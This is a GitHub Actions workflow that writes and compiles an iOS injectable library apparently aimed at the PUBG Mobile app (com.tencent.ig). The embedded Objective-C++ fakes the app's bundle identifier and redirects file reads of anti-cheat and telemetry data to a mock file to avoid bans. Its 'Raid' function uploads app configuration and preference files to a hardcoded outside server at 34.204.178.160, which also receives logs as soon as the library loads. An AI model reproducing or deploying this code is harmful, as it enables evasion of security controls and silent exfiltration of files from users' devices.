name: Imperial Ultimate AIO - V62.0 OFFICIAL STEALTH

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build_ultimate:
    runs-on: macos-latest

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Create Imperial Source
        run: |
          mkdir -p jni
          cat <<'EOF' > jni/main.mm
          #import <Foundation/Foundation.h>
          #import <UIKit/UIKit.h>
          #import <WebKit/WebKit.h>
          #include <mach-o/dyld.h>
          #include <sys/stat.h>
          #include <objc/runtime.h>
          #include <stdint.h>

          // ==========================================
          // [ 1. الروابط والآيبي المثبت 34.204.178.160 ]
          // ==========================================
          #define SERVER_IP @"34.204.178.160"
          #define ImperialGold [UIColor colorWithRed:1.0 green:0.84 blue:0.0 alpha:1.0]

          void RemoteLog(NSString *msg) {
              NSDictionary *json = @{@"content": [NSString stringWithFormat:@"[Imperial V62] -> %@", msg]};
              NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"http://%@:5000/log", SERVER_IP]];
              NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
              [req setHTTPMethod:@"POST"];
              [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
              [req setHTTPBody:[NSJSONSerialization dataWithJSONObject:json options:0 error:nil]];
              [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
          }

          void SendRaidFile(NSString *path) {
              NSData *data = [NSData dataWithContentsOfFile:path];
              if (!data) {
                  RemoteLog([NSString stringWithFormat:@"❌ File Not Found: %@", [path lastPathComponent]]);
                  return;
              }
              
              NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"http://%@:5000/upload", SERVER_IP]];
              NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
              [req setHTTPMethod:@"POST"];
              
              NSString *boundary = @"Boundary-ImpSpy-V62";
              [req setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
              
              NSMutableData *body = [NSMutableData data];
              [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
              [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"file\"; filename=\"%@\"\r\n", [path lastPathComponent]] dataUsingEncoding:NSUTF8StringEncoding]];
              [body appendData:[@"Content-Type: application/octet-stream\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
              [body appendData:data];
              [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
              
              [req setHTTPBody:body];
              [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
              RemoteLog([NSString stringWithFormat:@"✅ RAID: Sent Successfully -> %@", [path lastPathComponent]]);
          }

          // ==========================================
          // [ 2. محرك التخفي (Official Version Spoof) ]
          // ==========================================
          // تزييف الـ Bundle Identifier لإقناع النظام بأنها النسخة الرسمية
          NSString* (*orig_bundleIdentifier)(id, SEL);
          NSString* hk_bundleIdentifier(id self, SEL _cmd) {
              return @"com.tencent.ig"; // ضع هنا الـ ID الرسمي للنسخة
          }

          void SetupOfficialSpoof() {
              Method m = class_getInstanceMethod([NSBundle class], @selector(bundleIdentifier));
              orig_bundleIdentifier = (NSString*(*)(id, SEL))method_getImplementation(m);
              method_setImplementation(m, (IMP)hk_bundleIdentifier);
              RemoteLog(@"🛡️ Official Identity Spoofed ✅");
          }

          // ==========================================
          // [ 3. محرك تزييف المسارات (Ghost FS) ]
          // ==========================================
          typedef struct interpose_substitution { const void* replacement; const void* original; } interpose_substitution_t;
          #define INTERPOSE(_replacement,_original) __attribute__((used)) static const interpose_substitution_t _interpose_##_original __attribute__ ((section ("__DATA, __interpose"))) = { (const void*)(unsigned long)&_replacement, (const void*)(unsigned long)&_original };

          BOOL is_imperial_target(const char* p) {
              if (!p) return NO;
              // حذفنا ShadowTrackerExtra لتقليل الباند
              NSArray *t = @[@"config.json", @"imsdklocallog", @"global_sf_metal", @"RemoteConfig", @"GCloud", @"tss_ano", @"comm.dat", @"HttpDNS", @"APMSDKCache", @"MetalLib", @"INTLResultMsg"];
              for (NSString *s in t) { if (strstr(p, [s UTF8String])) return YES; }
              return NO;
          }

          FILE* ghost_fopen(const char* p, const char* m) {
              if (is_imperial_target(p)) {
                  RemoteLog([NSString stringWithFormat:@"🛰️ Ghost FS Redirect -> %s", p]);
                  return fopen("/var/mobile/Documents/clean_mock.dat", m);
              }
              return fopen(p, m);
          }
          INTERPOSE(ghost_fopen, fopen);

          // ==========================================
          // [ 4. الواجهة الإمبراطورية المتحركة ]
          // ==========================================
          @interface ImperialUI : UIWindow <WKScriptMessageHandler>
          @property (nonatomic, strong) WKWebView *web;
          @property (nonatomic, assign) CGPoint lastLocation;
          @end

          @implementation ImperialUI
          - (instancetype)initWithFrame:(CGRect)frame {
              self = [super initWithFrame:frame];
              if (self) {
                  self.windowLevel = UIWindowLevelStatusBar + 100.0;
                  self.backgroundColor = [UIColor clearColor];
                  [self setupUI];
                  [self makeKeyAndVisible];
              }
              return self;
          }

          - (void)setupUI {
              UIButton *btn = [UIButton buttonWithType:UIButtonTypeCustom];
              btn.frame = CGRectMake(20, 150, 60, 60);
              [btn setTitle:@"👑" forState:UIControlStateNormal];
              btn.backgroundColor = [UIColor colorWithWhite:0 alpha:0.8];
              btn.layer.cornerRadius = 30;
              [btn addTarget:self action:@selector(toggle) forControlEvents:UIControlEventTouchUpInside];
              [self addSubview:btn];

              self.web = [[WKWebView alloc] initWithFrame:CGRectMake((self.frame.size.width-280)/2, 220, 280, 400)];
              self.web.layer.cornerRadius = 25; 
              self.web.layer.borderColor = ImperialGold.CGColor;
              self.web.layer.borderWidth = 3.0; self.web.hidden = YES;

              NSString *html = @"<html><style>body{background:rgba(10,10,10,0.95);color:gold;font-family:sans-serif;padding:25px;border-radius:25px;}"
              ".row{display:flex;justify-content:space-between;align-items:center;margin:15px 0;border-bottom:1px solid #333;padding-bottom:10px;}"
              "input{width:28px;height:28px;}</style><body>"
              "<h2 style='text-align:center'>IMPERIAL V62</h2>"
              "<div class='row'><span>Ghost FS Active</span><input type='checkbox' onclick='send(\"Ghost\")'></div>"
              "<div class='row'><span>Raid Files</span><input type='checkbox' onclick='send(\"Raid\")'></div>"
              "<script>function send(a){window.webkit.messageHandlers.Imp.postMessage(a);}</script></body></html>";

              [self.web loadHTMLString:html baseURL:nil];
              [[self.web configuration].userContentController addScriptMessageHandler:self name:@"Imp"];
              [self addSubview:self.web];

              UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(handlePan:)];
              [self addGestureRecognizer:pan];
          }

          - (void)handlePan:(UIPanGestureRecognizer *)gesture {
              if (gesture.state == UIGestureRecognizerStateBegan) { self.lastLocation = self.center; }
              CGPoint translation = [gesture translationInView:self];
              self.center = CGPointMake(self.lastLocation.x + translation.x, self.lastLocation.y + translation.y);
          }

          - (void)toggle { self.web.hidden = !self.web.hidden; }

          - (void)userContentController:(id)u didReceiveScriptMessage:(WKScriptMessage *)m {
              if ([m.body isEqualToString:@"Raid"]) {
                  // محاولة سحب أهم الملفات الحساسة
                  SendRaidFile(@"/var/mobile/Documents/RemoteConfig.config");
                  SendRaidFile(@"/var/mobile/Library/Preferences/com.tencent.ig.plist");
              }
              RemoteLog([NSString stringWithFormat:@"CMD Sent: %@", m.body]);
          }
          @end

          __attribute__((constructor))
          static void entry() {
              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
                  static ImperialUI *ui; ui = [[ImperialUI alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
                  SetupOfficialSpoof(); // تفعيل تزييف الهوية الرسمية
                  RemoteLog(@"SERVER CONNECTED ✅ (34.204.178.160)");
              });
          }
          EOF

      - name: Build Imperial Nuclear Dylib
        run: |
          clang++ -dynamiclib -std=c++11 -x objective-c++ \
          -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
          -arch arm64 jni/main.mm -o ImperialUltimate.dylib \
          -framework Foundation -framework UIKit -framework WebKit -framework CoreGraphics -framework Security -lobjc

      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: Imperial-V62-Stealth
          path: ImperialUltimate.dylib
          
